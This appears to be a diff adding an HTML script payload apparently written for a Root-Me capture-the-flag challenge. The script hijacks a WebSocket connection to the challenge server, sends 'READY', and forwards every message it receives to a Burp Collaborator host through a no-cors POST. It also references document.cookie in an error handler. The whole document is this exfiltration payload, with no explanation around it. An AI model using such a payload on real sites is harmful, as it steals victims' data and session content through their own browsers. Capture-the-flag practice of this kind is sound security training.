@@ -1,0 +1,12 @@
+<script>
+    var ws = new WebSocket('ws://ctf01.root-me.org/ws');
+    ws.onopen = function(event) {
+        ws.send("READY");
+    };
+    ws.onerror = event => {
+        console.log("ERR: ", event)+document.cookie
+    }
+    ws.onmessage = function(event) {
+        fetch('https://nne1hfhwuf14ha7xt6919az1us0jo8.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
